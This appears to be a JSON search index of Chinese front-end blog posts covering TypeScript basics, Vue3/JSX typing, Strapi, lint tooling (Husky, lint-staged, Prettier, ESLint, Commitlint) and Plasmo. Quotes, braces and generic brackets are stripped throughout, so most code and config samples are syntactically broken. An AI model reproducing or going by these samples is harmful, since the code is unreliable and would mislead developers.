38);因此只建议在定义一个变量没有初始值的情况下显示的定义其类型（/fontfont style=color:#ED740C;而且也是必须的/fontfont style=color:rgb(24, 32, 38);）：/font/divcolor3font style=color:rgb(51, 51, 51);如果定义的时候没有赋值或者指定类型，不管之后有没有赋值，都会被推断成 any 类型而完全不被类型检查/font/div```typescriptlet myFavoriteNumber; // myFavoriteNumber 的类型就是 any 了，之后可以被任何类型的变量赋值myFavoriteNumber = seven;myFavoriteNumber = 7; 在定义变量没有默认值的情况下，必须指定其类型 // 布尔值let isDone: boolean;// 数值let decLiteral: number;// 字符串let myName: string;// Null 和 Undefinedlet u: undefined;let n: null;// Symbollet s: symbol;// BigIntlet b: bigint; 注意，TypeScript 中使用字面量和构造函数定义的变量的类型是不一样的： let bool1: boolean = false;let bool2: Boolean = new Boolean(0); 其他的基本类型都是一样，不再赘述。 void 和 neverJavascript 中没有 void 和 never 的概念。在 TypeScript 中，其作用如下： void表示没有任何返回值的函数 never表示那些永远不存的值的类型，例如那些总是会抛出异常或根本就不会有返回值的函数 void 应用场景： function alertName(): void alert(My name is Tom); 声明一个 void 类型的变量没有什么用，因为你只能将它赋值为 undefined 和 null（只在 –strictNullChecks 未指定时） let unusable: void = undefined; never 应用场景： // 返回never的函数必须存在无法达到的终点function error(message: string): never throw new Error(message);// 推断的返回值类型为neverfunction fail() return error(Something failed);// 返回never的函数必须存在无法达到的终点function infiniteLoop(): never while (true) never 类型是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是 never 的子类型或可以赋值给 never 类型（除了 never 本身之外）。 即使 any 也不可以赋值给 never。 对象类型使用 interface 定义对象的类型： interface Person name: string; age: number;let tom: Person = name: Tom, age: 25,; 上面的例子中，tom 的形状和接口 Person 必须一致，对象的元素不允许多也不允许少，赋值的时候变量的形状必须和接口的形状保持一致。 如何少一些字段： 使用可选属性 ?:，但是依旧不允许添加未定义的属性： interface Person name: string; age?: number;let tom: Person = name: Tom,;let tom1: Person = name: Tom, age: 25, gender: male,;// examples/playground/index.ts(9,5): error TS2322: Type name: string; age: number; gender: string; is not assignable to type Person.// Object literal may only specify known properties, and gender does not exist in type Person. 如何多一些字段： 可以定义一个任意属性，需要注意的是，一个接口只能定义一个任意属性： interface Person name: string; age?: number; [propName: string]: string;let tom: Person = name: Tom, gender: male,;let tom1: Person = name: Tom, age: 25, gender: male,;// index.ts(3,5): error TS2411: Property age of type number is not assignable to string index type string.// index.ts(7,5): error TS2322: Type [x: string]: string | number; name: string; age: number; gender: string; is not assignable to type Person.// Index signatures are incompatible.// Type string | number is not assignable to type string.// Type number is not assignable to type string. 注意：一旦定义了任意属性，那么确定属性和可选属性的类型都必须是它的类型的子集，上例中，任意属性的值允许是 string，但是可选属性 age 的值却是 number，number 不是 string 的子属性，所以报错了。 属性只读： 使用 readonly 定义的只读属性只能在创建的是否被赋值： interface Person readonly id: number; name: string; age?: number; [propName: string]: any;let tom: Person = id: 89757, name: Tom, gender: male,;tom.id = 9527;// index.ts(14,5): error TS2540: Cannot assign to id because it is a constant or a read-only property. 注意，只读的约束存在于第一次给对象赋值的时候，而不是第一次给只读属性赋值的时候 数组类型在 TypeScript 中，定义数组类型的方式有多种，比较灵活。 // 「类型 + 方括号」表示法let fibonacci: number[] = [1, 1, 2, 3, 5];// 数组泛型let fibonacci: Arraynumber = [1, 1, 2, 3, 5];// 接口interface NumberArray [index: number]: number;let fibonacci: NumberArray = [1, 1, 2, 3, 5]; 函数类型在 JavaScript 中，有两种常见的定义函数的方式 - 函数声明和函数表达式： 函数函数声明： // 函数声明function sum(x, y) return x + y;// 添加类型定义function sum(x: number, y: number): number return x + y; 函数表达式： // 函数表达式let mySum = function (x, y) return x + y;;// 添加类型定义let mySum = function (x: number, y: number): number return x + y;;// 上面 mySum 的类型是根据 = 的右侧推断出来的，如果需要显示的指定其类型let mySum: (x: number, y: number) = number = function ( x: number, y: number): number return x + y;;// 可以使用接口来定义函数的类型interface SearchFunc (source: string, subString: string): boolean;let mySearch: SearchFunc = function (source: string, subString: string) return source.search(subString) !== -1;; 参数可选： 与接口中的可选属性类似，我们用 ? 表示可选的参数，需要注意的是：可选参数后面不允许再出现必需参数了 function buildName(firstName: string, lastName?: string) if (lastName) return firstName + + lastName; else return firstName; let tomcat = buildName(Tom, Cat);let tom = buildName(Tom); 参数默认值： 在 ES6 中，我们允许给函数的参数添加默认值，TypeScript 会将添加了默认值的参数识别为可选参数： function buildName(firstName: string, lastName: string = Cat) return firstName + + lastName;let tomcat = buildName(Tom, Cat);let tom = buildName(Tom); 此时就不受「可选参数必须接在必需参数后面」的限制了： function buildName(firstName: string = Tom, lastName: string) return firstName + + lastName;let tomcat = buildName(Tom, Cat);let cat = buildName(undefined, Cat); 剩余参数： ES6 中，可以使用 font style=color:rgb(51, 51, 51);...rest/font 的方式获取函数中的剩余参数（rest 参数）： function push(array, ...items) items.forEach(function (item) array.push(item); );let a: any[] = [];push(a, 1, 2, 3); 事实上，font style=color:rgb(51, 51, 51);items /font是一个数组。所以我们可以用数组的类型来定义它： function push(array: any[], ...items: any[]) items.forEach(function (item) array.push(item); );let a = [];push(a, 1, 2, 3); 函数重载： 重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。 比如，我们需要实现一个函数 reverse，输入数字 123 的时候，输出反转的数字 321，输入字符串 ‘hello’ 的时候，输出反转的字符串 ‘olleh’。 利用联合类型，我们可以这么实现： function reverse(x: number | string): number | string | void if (typeof x === number) return Number(x.toString().split().reverse().join()); else if (typeof x === string) return x.split().reverse().join(); 然而这样有一个缺点，就是不能够精确的表达，输入为数字的时候，输出也应该为数字，输入为字符串的时候，输出也应该为字符串。 这时，我们可以使用重载定义多个 reverse 的函数类型： function reverse(x: number): number;function reverse(x: string): string;function reverse(x: number | string): number | string | void if (typeof x === number) return Number(x.toString().split().reverse().join()); else if (typeof x === string) return x.split().reverse().join(); 上例中，我们重复定义了多次函数 reverse，前几次都是函数定义，最后一次是函数实现。在编辑器的代码提示中，可以正确的看到前两个提示。 注意，TypeScript 会优先从最前面的函数定义开始匹配，所以多个函数定义如果有包含关系，需要优先把精确的定义写在前面。 类类型下面看一个使用类的例子： class Greeter greeting: string; constructor(message: string) this.greeting = message; greet() return Hello, + this.greeting; let greeter = new Greeter(world); 继承： class Animal name: string; constructor(theName: string) this.name = theName; move(distanceInMeters: number = 0) console.log(`$this.name moved $distanceInMetersm.`); class Snake extends Animal constructor(name: string) super(name); move(distanceInMeters = 5) console.log(Slithering...); super.move(distanceInMeters); class Horse extends Animal constructor(name: string) super(name); move(distanceInMeters = 45) console.log(Galloping...); super.move(distanceInMeters); let sam = new Snake(Sammy the Python);let tom: Animal = new Horse(Tommy the Palomino);sam.move();tom.move(34); 公共，私有与受保护的修饰符： public：默认的修饰符，允许在类的外部和派生类访问 private：不允许在声明它的类的外部访问 protected：允许在派生类中访问 class Person protected name: string; constructor(name: string) this.name = name; class Employee extends Person private department: string; constructor(name: string, department: string) super(name); this.department = department; public getElevatorPitch() return `Hello, my name is $this.name and I work in $this.department.`; let howard = new Employee(Howard, Sales);console.log(howard.getElevatorPitch());console.log(howard.name); // 错误 **属性只读：**你可以使用 readonly 关键字将属性设置为只读的。 只读属性必须在声明时或构造函数里被初始化。 class Octopus readonly name: string; readonly numberOfLegs: number = 8; constructor(theName: string) this.name = theName; let dad = new Octopus(Man with the 8 strong legs);dad.name = Man with the 3-piece suit; // 错误! name 是只读的. 静态属性： class Grid static origin = x: 0, y: 0 ; calculateDistanceFromOrigin(point: x: number; y: number ) let xDist = point.x - Grid.origin.x; let yDist = point.y - Grid.origin.y; return Math.sqrt(xDist * xDist + yDist * yDist) / this.scale; constructor(public scale: number) let grid1 = new Grid(1.0); // 1x scalelet grid2 = new Grid(5.0); // 5x scaleconsole.log(grid1.calculateDistanceFromOrigin( x: 10, y: 10 ));console.log(grid2.calculateDistanceFromOrigin( x: 10, y: 10 )); 抽象类： 抽象类的特性如下： 抽象类做为其它派生类的基类使用。 它们一般不会直接被实例化 抽象类可以包含成员的实现细节 abstract 关键字是用于定义抽象类和在抽象类内部定义抽象方法 抽象类中的抽象方法不包含具体实现并且必须在派生类中实现 abstract class Department constructor(public name: string) printName(): void console.log(Department name: + this.name); abstract printMeeting(): void; // 必须在派生类中实现class AccountingDepartment extends Department constructor() super(Accounting and Auditing); // 在派生类的构造函数中必须调用 super() printMeeting(): void console.log(The Accounting Department meets each Monday at 10am.); generateReports(): void console.log(Generating accounting reports...); let department: Department; // 允许创建一个对抽象类型的引用department = new Department(); // 错误: 不能创建一个抽象类的实例department = new AccountingDepartment(); // 允许对一个抽象子类进行实例化和赋值department.printName();department.printMeeting();department.generateReports(); // 错误: 方法在声明的抽象类中不存在 ****"},{"title":"Vue3 + JSX + Typescript 使用手册","path":"/2023/07/31/096fe8cfde27/","content":"背景知识对标题提到的知识不熟悉的，这里推荐几个学习的地方： Vue3 - https://cn.vuejs.org/guide/introduction.html JSX - https://cn.vuejs.org/guide/extras/render-function.html Typescript - https://ts.xcatliu.com/introduction/what-is-typescript.html 工程搭建脚手架先来说下如何搭建个 Vue3 + Ts 的脚手架，这也分两种情况，下面分开说： 从零开始 从零开始的话可以使用 create-vue，即官方的项目脚手架工具，提供了基于 vite + Ts 的脚手架模板。 更多的使用细节，见官方文档 https://cn.vuejs.org/guide/typescript/overview.html#project-setup Vue 之前还提供过一个 Vue CLI 工具基于 webpack 平台，也可以用来生成 Vue3 的脚手架，但是现在已处于维护状态，官方也建议基于 vite 平台开发，因此这里就不过多介绍了。 脚手架升级 第二种就是在现有的脚手架上添加上 Typescript ，这种情况就不好说了，原先的脚手架可能是 Vue CLI 生成的，create-vue 生成的，或者直接用 webpack，rollup 等工具手撸出来的，可能性太多，我也没办法枚举出来。 这里我列下我在网上找到了，如何在现有的项目中添加 TS 的文档，可以参考下： Vue CLI：https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue/cli-plugin-typescript Vite：https://cn.vitejs.dev/guide/features.html#typescript Webpack：https://webpack.docschina.org/guides/typescript/ Rollup：https:www.npmjs.compackage@rollupplugin-typescript 现在的前端工程都是多个工具集成在一起的超复杂配置，而上面的文档都是单点工具的集成，不一定有用，因此这里建议集成 TS 时可以从 github 上找下有没有类似的项目，参考现有工程可以轻松一点。 配置 JSX如何在 Vue 中使用 JSX 需要单独说明一下，因为它一般在脚手架里不是默认配置的，Vue 官方推荐的写法是单文件组件，但是其在灵活性上还是差点意思，因此我还是更喜欢用 JSX 去写模板。 Vue 官方也是有考虑到我们这部分人的需求，因此推出了一系列插件，来支持 JSX 模板的渲染。 Vite ## 安装依赖pnpm add @vitejs/plugin-vue-jsx -D## 在 vite.config.ts 中添加插件import defineConfig from vite;import vueJsx from @vitejs/plugin-vue-jsx;export default defineConfig( plugins: [ vueJsx(), ]) Vue CLI ## 检查下 babel.config.js 中配置是有 @vue/cli-plugin-babel/preset，有的话无需额外配置## preset 中已经包含了 jsx 的插件配置module.exports = presets: [@vue/cli-plugin-babel/preset], plugins: [],;## 否则的话就需要单独配置了## 安装插件pnpm add @vue/babel-plugin-jsx -D## 在 babel.config.js 中添加插件module.exports = plugins: [@vue/babel-plugin-jsx],; 类型定义下面来到文章的重点了，本章节会介绍下如何对 Vue 的一些语法进行类型标注，下面看下一个 Vue3 + JSX + Typescript 的组件长什么样？ import type SlotsType from vue;import defineComponent from vue;export const IconButton = defineComponent( name: IconButton, props: actived: type: Boolean, default: false, , tight: type: Boolean, default: false, , , emits: click: () = true , slots: Object as SlotsType default: any , setup(props, emit, slots ) return () = ( div onClick=() = emit(click) class=[ rounded cursor-pointer hover:bg-[rgba(0,0,0,.04)] inline-flex, props.tight ? p-1 : p-[6px], bg-[rgba(0,0,0,.04)]: props.actived , ] slots.default?.() /div ); ,); 众所周知 Vue3 的语法分成两种：组合式和选项式，这里采用的就是选项示的写法，但是因为采用了 JSX，所有的代码都需要包裹在 defineComponent，导致代码看起来既像组合式又像选项示，起初看文档时也给我整懵了，实际上他还是选项示，只是 props，emits 等定义和组合式雷同而已。 为组件的 props 标注类型import defineComponent from vue;export default defineComponent( props: message: String, , setup(props) props.message; // -- 类型：string ,); 复杂的 prop 类型 对于复杂类型，我们可以使用 PropType 工具类型： import defineComponent from vueimport type PropType from vueexport default defineComponent( props: book: Object as PropTypeBook ) 不借助工具函数也可以： import defineComponent from vueimport type PropType from vueexport default defineComponent( props: book: Object as () = Book ) 为组件的 emits 标注类型import defineComponent from vue;export default defineComponent( emits: [change], setup(props, emit ) emit(change); // -- 类型检查 / 自动补全 ,); 如果 emit 函数有入参，我们可以将 emits 改成对象的形式： import defineComponent from vueexport default defineComponent( emits: change：(value: string) = true, // 函数内部可以执行运行时检查 , setup(props, emit ) emit(change, text) // -- 类型检查 / 自动补全 ) 为组件的 slots 标注类型我们可以使用 SlotsType 工具类型： import defineComponent from vueexport default defineComponent( slots: Object as SlotsType footer: any , setup(props, slots ) return () = ( div slots.footer?.() /div )) 为 ref() 标注类型ref 会根据初始化时的值推导其类型： import ref from vue;// 推导出的类型：Refnumberconst year = ref(2020);// = TS Error: Type string is not assignable to type number.year.value = 2020; 有时我们可能想为 ref 内的值指定一个更复杂的类型，可以通过使用 Ref 这个类型： import ref from vue;import type Ref from vue;const year: Refstring | number = ref(2020);year.value = 2020; // 成功！ 或者，在调用 ref() 时传入一个泛型参数，来覆盖默认的推导行为： // 得到的类型：Refstring | numberconst year = (ref string) | (number 2020);year.value = 2020; // 成功！ 如果你指定了一个泛型参数但没有给出初始值，那么最后得到的就将是一个包含 undefined 的联合类型： // 推导得到的类型：Refnumber | undefinedconst n = refnumber() 为 reactive() 标注类型reactive() 也会隐式地从它的参数中推导类型： import reactive from vue;// 推导得到的类型： title: string const book = reactive( title: Vue 3 指引 ); 要显式地标注一个 reactive 变量的类型，我们可以使用接口： import reactive from vueinterface Book title: string year?: numberconst book: Book = reactive( title: Vue 3 指引 ) 不推荐使用 **reactive()** 的泛型参数，因为处理了深层次 ref 解包的返回值与泛型参数的类型不同。 为 computed() 标注类型computed() 会自动从其计算函数的返回值上推导出类型： import ref, computed from vue;const count = ref(0);// 推导得到的类型：ComputedRefnumberconst double = computed(() = count.value * 2);// = TS Error: Property split does not exist on type numberconst result = double.value.split(); 你还可以通过泛型参数显式指定类型： const double = computed number (() = // 若返回值不是 number 类型则会报错 ); 为 provide inject 标注类型provide 和 inject 通常会在不同的组件中运行。要正确地为注入的值标记类型，Vue 提供了一个 InjectionKey 接口，它是一个继承自 Symbol 的泛型类型，可以用来在提供者和消费者之间同步注入值的类型： import provide, inject from vueimport type InjectionKey from vueconst key = Symbol() as InjectionKeystringprovide(key, foo) // 若提供的是非字符串值会导致错误const foo = inject(key) // foo 的类型：string | undefined 建议将注入 key 的类型放在一个单独的文件中，这样它就可以被多个组件导入。 当使用字符串注入 key 时，注入值的类型是 unknown，需要通过泛型参数显式声明： const foo = inject string foo; // 类型：string | undefined 注意注入的值仍然可以是 undefined，因为无法保证提供者一定会在运行时 provide 这个值。 当提供了一个默认值后，这个 undefined 类型就可以被移除： const foo = inject string (foo, bar); // 类型：string 如果你确定该值将始终被提供，则还可以强制转换该值： const foo = inject(foo) as string 为模板引用标注类型模板引用需要通过一个显式指定的泛型参数和一个初始值 null 来创建： script setup lang=tsimport ref, onMounted from vueconst el = refHTMLInputElement | null(null)onMounted(() = el.value?.focus())/scripttemplate input ref=el //template 可以通过类似于 MDN 的页面来获取正确的 DOM 接口。 注意为了严格的类型安全，有必要在访问 el.value 时使用可选链或类型守卫。这是因为直到组件被挂载前，这个 ref 的值都是初始的 null，并且在由于 v-if 的行为将引用的元素卸载时也可以被设置为 null。 为组件模板引用标注类型有时，你可能需要为一个子组件添加一个模板引用，以便调用它公开的方法。举例来说，我们有一个 MyModal 子组件，它有一个打开模态框的方法： !-- MyModal.vue --script setup lang=tsimport ref from vueconst isContentShown = ref(false)const open = () = (isContentShown.value = true)defineExpose( open)/script 为了获取 MyModal 的类型，我们首先需要通过 typeof 得到其类型，再使用 TypeScript 内置的 InstanceType 工具类型来获取其实例类型： !-- App.vue --script setup lang=tsimport MyModal from ./MyModal.vueconst modal = refInstanceTypetypeof MyModal | null(null)const openModal = () = modal.value?.open()/script 注意，如果你想在 TypeScript 文件而不是在 Vue SFC 中使用这种技巧，需要开启 Volar 的 Takeover 模式。 如果组件的具体类型无法获得，或者你并不关心组件的具体类型，那么可以使用 ComponentPublicInstance。这只会包含所有组件都共享的属性，比如 $el。 import ref from vue;import type ComponentPublicInstance from vue;const child = (ref ComponentPublicInstance) | (null null); 总结由于 Vue 的语法糖太多，导致 Vue 的官方文档就像是一个大杂烩，大而全，也导致了我在看官方文档时被各种写法，各种 API 搞的迷迷糊糊。因此我在官方文档的基础上加上自己的一些理解，整理出了这篇手册，希望能帮助到你。（小声逼逼下：这套技术栈写起来好像 react 啊，要不你两合并算了）"},{"title":"Strapi：一款基于Node.js 开发的无头内容管理系统","path":"/2023/07/25/0415a8b11d8e/","content":"strapi 是什么？strapi 这个名字取自 bootstrap 的后缀 strap，然后因为它是一个提供快速生成安全可靠的 api 架构，然后再加了一个 i，合并就是 strapi，bootstrap 的有启动的意思，你可以用 strapi 来快速构建你的后端，可以快速让自己的项目启动。 几个关键词 快速 ：是因为一个命令就生成了后端用户、权限、文件上传等基本的后端轮子 简单：strapi 启动后，有一个后端管理页面，你可以在后端新增表，新增完成后，后端自动重启，然后生成与之对应的增删改查的基本 api 安全：strapi 充分考虑了 api 的安全性，对每个接口都有保护限制，你可以在后端管理页面去做定制化的配置 插件化：内置了基本够用的插件，如内容管理器、API 文档、媒体库、角色权限，你也可以按照官方设定，制作自己的插件 自定义 API：除了官方自动生成的 api，你也可以自己编写定制的 api，内置了丰富的变量，并支持 graphql 本地部署：strapi 是完全开源的，其实就是一个后端轮子，down 下来后，改改业务就可以发布了，完全由你掌控，而不是一个云端产品。 你可以把 strapi 当做自己开发项目的快速启动的工具，就算没有后端基础，只要会 js，你就可以写出专业级的后端，是前端开发者的福利，更是独立开发者的一把尖刀利器！"},{"title":"前端编程规范工具链","path":"/2023/07/17/a9d235b55733/","content":"当多个开发人员合作开发一个前端项目时，代码质量和一致性是非常重要的。在大型项目中，代码质量和一致性的缺失可能会导致团队之间的沟通问题和代码维护的困难。为了确保代码质量和一致性，前端编程规范工具链是必不可少的。 它可以帮助团队在整个开发周期内保持代码风格的一致性，减少错误和冲突，并提高代码质量和效率。在这篇文章中，我们将介绍一些常用的前端编程规范工具，以及它们如何帮助团队提高代码质量和效率。 Husky https://github.com/typicode/husky Husky 是一个 Git 钩子工具，可以在 Git 操作（例如提交或推送）之前运行脚本。它可以帮助团队确保代码符合前端编程规范，并在提交或推送之前运行 ESLint、Prettier 和 Stylelint 等工具。 Git HookGit hook 都被存储在 Git 目录下的 hooks 子目录中。 也即绝大部分项目中的 .githooks 。 这些以 .sample 结尾的文件都是在 git init 初始化时，git 默认安装的示例文件，这些文件都是 shell 脚本，移除后缀就可以启动了。 这些钩子的执行时机和作用如下： 分类 钩子 描述 提交工作流钩子 pre-commit git commit 前运行，可以检查代码风格是否一致、单元测试等 prepare-commit-msg 钩子在启动提交信息编辑器之前，默认信息被创建之后运行。 它允许你编辑提交者所看到的默认信息。 commit-msg 接收一个参数，git commit 信息的文件路径（默认为.gitCOMMIT_EDITMSG） post-msg git commit 之后运行，一般用于通知之类的事情，如：git log -1 HEAD 电子邮件工作流钩子 applypatch-msg 它接收单个参数：包含请求合并信息的临时文件的名字。 如果脚本返回非零值，Git 将放弃该补丁。 你可以用该脚本来确保提交信息符合格式，或直接用脚本修正格式错误。 pre-applypatch 它正好运行于应用补丁之后，产生提交之前，所以你可以用它在提交前检查快照。 你可以用这个脚本运行测试或检查工作区。 如果有什么遗漏，或测试未能通过，脚本会以非零值退出，中断 git am 的运行，这样补丁就不会被提交 post-applypatch 运行于提交产生之后，是在 git am 运行期间最后被调用的钩子。 你可以用它把结果通知给一个小组或所拉取的补丁的作者。 但你没办法用它停止打补丁的过程 其它客户端钩子 pre-rebase git rebase 之前 post-rewrite 被那些会替换提交记录的命令调用，比如 git commit –amend 和 git rebase（不过不包括 git filter-branch） post-checkout git checkout 成功运行后 post-merge 在 git merge 成功运行后 pre-push 会在 git push 运行期间， 更新了远程引用但尚未传送对象时被调用 服务器端钩子 pre-receive 处理来自客户端的推送操作时，最先被调用的脚本是 pre-receive。 update update 脚本和 pre-receive 脚本十分类似，不同之处在于它会为每一个准备更新的分支各运行一次。 post-receive post-receive 挂钩在整个过程完结以后运行，可以用来更新其他系统服务或者通知用户。 这里只是简单的介绍了下各个钩子的作用，要想更深入的了解这些钩子，请看官方文档：自定义 Git - Git 钩子 既然把一个正确命名（不带扩展名）且可执行的文件放入 .git 目录下的 hooks 子目录中，即可激活该钩子脚本。为什么还要使用 husky ，这是因为 .git 目录下的文件变动 git 本身是无法监听到的，无法统一管理 hook 脚本。 Husky 低版本安装#1、安装huskynpm install husky --save-dev#2、在package.json中添加使用钩子 husky: hooks: pre-commit: npm run test, // 在commit之前先执行npm run test命令 commit-msg: commitlint -e $HUSKY_GIT_PARAMS // 校验commit时msg是否符合我们要求的规范 Husky 高版本安装（从 v6.0 之后）使用方法 1: #1、安装 huskynpm install husky --save-dev#2、Enable Git hooksnpx husky install#3、为了在项目 npm install 之后，运行第二步，在 package.json 中添加如下内容 scripts: prepare: husky install 推荐使用方法： # 安装 husky，修改 package.json 配置，默认添加 pre-commit hooknpx husky-init npm install 添加其他 git hook 如下： npx husky add .husky/commit-msg npx --no-install commitlint --edit $1 npx husky install 做了两件事： 在根目录新建.husky 目录，用于存放 git hook； 修改 .gitconfig 配置文件，core.hooksPath .husky(指向 husky 新建的目录) huksy 在 6.0 时有个破坏性升级，hook 配置方式和之前皆然不同，为什么放弃之前的配置方式： Why husky has dropped conventional JS config Why husky doesn’t autoinstall anymore 中文可以参考这篇husky 使用总结 Lint-Staged https://github.com/okonet/lint-staged lint-staged 是一个 Git 钩子工具，可以在 Git 操作（例如提交或推送）之前运行脚本。它可以帮助团队仅对更改过的文件（暂存区中的文件）运行 ESLint、Prettier 和 Stylelint 等工具，从而提高效率并减少不必要的检查。 安装 lint-staged #npm install lint-staged --save-dev 在 husky 中添加 pre-commit 钩子，执行 lint-staged 命令 #!/bin/sh. $(dirname $0)/_/husky.shpnpm exec lint-staged 在 package.json 中添加配置 lint-staged: *.vue,js,ts,jsx,tsx,md,json: eslint --fix Prettier https://github.com/prettier/prettier Prettier Prettier 是一个自动化代码格式化工具，可以根据预定义的规则自动格式化代码。它支持多种编程语言，并且可以与 ESLint 集成以确保代码风格的一致性。Prettier 可以与大多数编辑器和 IDE 集成，以便在编写代码时自动格式化代码。 Prettier 不仅仅是一个代码格式化工具，还是一整套风格指南，并且大部分规则不可改变。作者在在 Prettier 官方文档的 “Why Prettier?”章节中，详细回答了这么做的原因。虽然有一个通用的代码风格对项目和团队来说很有好处，但是编码是个特别情绪化的过程，就像一千个读者就有一千个哈姆雷特一样，每个人钟意的风格都不一样，开发已经很累了，没必要浪费时间讨论风格问题。Prettier 使用争议最小的编码风格，足以让大部分人满意了，考虑到 Prettier 的独特优势，这些“牺牲”还是值得的。 安装 prettier npm install --save-dev --save-exact prettier 配置 prettier 风格 prettier 支持多种格式的配置文件 Configuration File · Prettier echo .prettierrc.json 添加个空的配置文件是为了告诉 vscode，你的项目正在使用 prettier，配合 [Prettier - Code formatter](Prettier - Code formatter) 插件可以实现保存时自动格式化 添加忽略文件 # Ignore artifacts:buildcoverage 格式化 npx prettier . --write 直接使用 **npx prettier . --write** 会格式化整个项目的所有代码，这很没必要，配合 lint-staged，只格式化改动的代码。 lint-staged: *.vue,js,ts,jsx,tsx,md,json: prettier . --write ESLint https://github.com/eslint/eslint ESLint 是一个非常流行的 JavaScript 代码检查工具，可以帮助团队确保代码风格的一致性。它支持大多数 JavaScript 代码风格，并且可以通过插件进行扩展以满足团队的特定需求。ESLint 还可以与许多编辑器和集成开发环境（IDE）集成，以便在编写代码时自动检查代码。 配置 Eslint 安装 eslint npm install --save-dev eslint 添加任一支持的配置文件格式的 .eslintrc 文件。 # 创建 JavaScript 配置文件touch .eslintrc.js 添加配置 // .eslintrc.js 示例module.exports = env: browser: true, es2021: true , extends: eslint:recommended, parserOptions: ecmaVersion: latest, sourceType: module , 具体的 Eslint 规则配置这里不多介绍了，可以看下这篇文章 - 看完这篇文章，我不信你还对 eslint 一知半解 执行检查命令 npx eslint project-dir/ file1.js 解决 Eslint 和 Prettier 冲突的问题当在项目中同时配置 Eslint 和 Prettier 时就会出现冲突的问题，这是因为 Eslint 可以同时进行代码风格及质量校验，因此在代码风格方面就和 Prettier 冲突了，这个时候我们希望代码格式由 Prettier 负责就好，而 Eslint 只需负责代码质量。 解决方案时借助 eslint-config-prettier 和 eslint-plugin-prettier。 eslint-config-prettier 作用是关闭 eslint 中与 prettier 冲突的规则。 eslint-plugin-prettier 作用是让 eslint 用 prettier 来格式化，相当于当代码格式不符合 prettier 的配置的时候，也可以报错一个 eslint 错误。 修改配置如下： module.exports = extends: [ // 新增如下的配置，实际上就是eslint-plugin-prettier的推荐规则集 // 而eslint-plugin-prettier实际上就是依赖eslint-config-prettier来关闭冲突的，使用前需同时安装这两个包 plugin:prettier/recommended, ],; 最后同样使用 lint-staged 只格式化改动的文件： lint-staged: *.vue,js,ts,jsx,tsx,md,json: eslint --fix 如果在上一步你的 vscode 配置了保存后 prettier 自动格式化，那么就会出现 prettier 格式化后，eslint 报错的问题，其解决方案也很简单，使用 eslint 去格式化： 使用 prettier 格式化配置如下: “editor.formatOnSave”: true, 保存后自动格式化 “editor.defaultFormatter”: “esbenp.prettier-vscode”, 默认使用 prettier 格式化“[javascript]”: { 手动配置各种文件的格式化工具 “editor.defaultFormatter”: “esbenp.prettier-vscode” } 修改后，使用 eslint 格式化“editor.formatOnSave”: false, 禁止保存后自动格式化“editor.codeActionsOnSave”: { “source.fixAll.eslint”: true } Commitlint https://commitlint.js.org/#/ Commitlint 是一个 Git 提交消息检查工具，可以帮助团队确保 Git 提交消息的一致性和规范性。它可以检查提交消息的格式、结构和内容，并提供有用的错误提示和建议。Commitlint 可以与 Husky 集成，以便在提交代码时自动运行。 要将 commitlint 集成到项目中，需要安装以下工具： @commitlintcli：用于校验 Git 提交信息格式 @commitlintconfig-conventional：一套约定式的 commit message 书写规范（可选，可以自定义规范） @commitlintprompt-cli：交互式 commit message 书写工具 commitizen：同 @commitlintprompt-cli，二选一就行 @commitlintcz-commitlint：commitizen 的适配器 cz-git：同 @commitlintcz-commitlint，二选一就行 上面 commitlint 的工具链也是非常多的，不需要都安装，按需使用即可，这里我们选择 @commitlintcli + commitizen + cz-git 安装 npm install @commitlint/cli commitizen cz-git -D 添加配置文件，这一步我们不使用 @commitlintconfig-conventional，而是自定义规范 const fg = require(fast-glob);const packages = fg.sync(*, cwd: packages, onlyDirectories: true );/** @type import(cz-git).UserConfig */module.exports = rules: // @see: https://commitlint.js.org/#/reference-rules scope-enum: [2, always, [...packages]], subject-min-length: [2, always, 2], subject-empty: [2, never], , prompt: alias: fd: docs: fix typos , messages: type: 选择你要提交的类型 :, scope: 选择一个提交范围（可选）:, customScope: 请输入自定义的提交范围 :, subject: 填写简短精炼的变更描述 : , body: 填写更加详细的变更描述（可选）。使用 | 换行 : , breaking: 列举非兼容性重大的变更（可选）。使用 | 换行 : , footerPrefixesSelect: 选择关联issue前缀（可选）:, customFooterPrefix: 输入自定义issue前缀 :, footer: 列举关联issue (可选) 例如: #31, #I3244 : , confirmCommit: 是否提交或修改commit ?, , types: [ value: feat, name: feat: 新增功能 | A new feature , value: fix, name: fix: 修复缺陷 | A bug fix , value: docs, name: docs: 文档更新 | Documentation only changes, , value: style, name: style: 代码格式 | Changes that do not affect the meaning of the code, , value: refactor, name: refactor: 代码重构 | A code change that neither fixes a bug nor adds a feature, , value: perf, name: perf: 性能提升 | A code change that improves performance, , value: test, name: test: 测试相关 | Adding missing tests or correcting existing tests, , value: build, name: build: 构建相关 | Changes that affect the build system or external dependencies, , value: ci, name: ci: 持续集成 | Changes to our CI configuration files and scripts, , value: revert, name: revert: 回退代码 | Revert to a commit , value: chore, name: chore: 其他修改 | Other changes that do not modify src or test files, , ], useEmoji: false, emojiAlign: center, useAI: false, aiNumber: 1, themeColorCode: , scopes: packages, allowCustomScopes: true, allowEmptyScopes: true, customScopesAlign: bottom, customScopesAlias: custom, emptyScopesAlias: empty, upperCaseSubject: false, markBreakingChangeMode: false, allowBreakingChanges: [feat, fix], breaklineNumber: 100, breaklineChar: |, skipQuestions: [], issuePrefixes: [ // 如果使用 gitee 作为开发管理 value: link, name: link: 链接 ISSUES 进行中 , value: closed, name: closed: 标记 ISSUES 已完成 , ], customIssuePrefixAlign: top, emptyIssuePrefixAlias: skip, customIssuePrefixAlias: custom, allowCustomIssuePrefix: true, allowEmptyIssuePrefix: true, confirmColorize: true, maxHeaderLength: Number.POSITIVE_INFINITY, maxSubjectLength: Number.POSITIVE_INFINITY, minSubjectLength: 0, scopeOverrides: undefined, defaultBody: , defaultIssues: , defaultScope: , defaultSubject: , ,; 在 package.json 中添加如下配置 scripts: cz: cz , config: commitizen: path: node_modules/cz-git 添加 commit-msg 钩子 #!/usr/bin/env sh. $(dirname -- $0)/_/husky.shpnpm exec commitlint --edit $1 上面的配置都完成后，运行 pnpm cz，按照提示填写 commit 信息： 也可以全局安装 commitizen，之后使用 git cz 命令替换 git commit 命令："},{"title":"初探 Plasm 框架","path":"/2023/07/11/5d26d957a5fc/","content":"Plasm 是什么？ Plasmo 是个浏览器插件开发框架，号称浏览器扩展界的 Next.js ！ 其框架提供的特性如下： 一流的 React + Typescript 支持 